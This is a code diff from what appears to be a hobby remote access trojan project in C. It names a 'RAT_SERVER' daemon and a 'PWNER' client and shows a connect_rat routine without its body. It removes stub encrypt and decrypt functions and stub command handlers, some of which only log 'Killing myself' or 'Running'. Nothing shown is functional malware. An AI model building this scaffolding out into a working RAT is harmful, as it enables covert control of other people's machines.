@@ -2,15 +2,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <clog/clog.h> //logging library
+
 #include <net_util.h> //networking library
-//#include <crypt/crypt.h>
-/**
-    #Just for reference
-    int connect_server(char * hostname, int port); //connects to server
-    int start_server(int port); //starts server in its place
-    int writeln(int sockfd, const char *msg, int len); //writes to connection
-    const char *readln(int sockfd); //reads from connection
-    **/
+#include <crypt.h>
 
 #define SECRET_MSG "bla"
 #define CONNECT_ACK "ack"
@@ -18,15 +12,6 @@
 #define MAIN "MAIN"
 #define DAEMON "RAT_SERVER"
 #define CLIENT "PWNER"
-
-static const char *decrypt(const char *msg){
-  //TODO use library
-  return msg;
-}
-static const char *encrypt(const char *msg){
-  //TODO use library
-  return msg;
-}
 
 typedef const char* (*callback)(int, const char**);
 
@@ -64,24 +49,7 @@ int connect_rat(const char* hostname, int port)
 }
 
 //no operation
-const char* no_op(int count, const char** argv)
-{
-    clog_i(DAEMON, "NO-OP");
-    return "Function does not exist";
-}
 
-const char* suicide(int count, const char** argv)
-{
-    clog_i(DAEMON, "Killing myself");
-    return "The deed will be done";
-}
-
-const char* run(int count, const char** argv)
-{
-  if(count < 2)return "Invalid Arguents";
-    clog_i(DAEMON, "Running %s", argv[1]);
-    return "Running the service";
-}
 
 //always returns a function
 callback hash_function(const char* str)
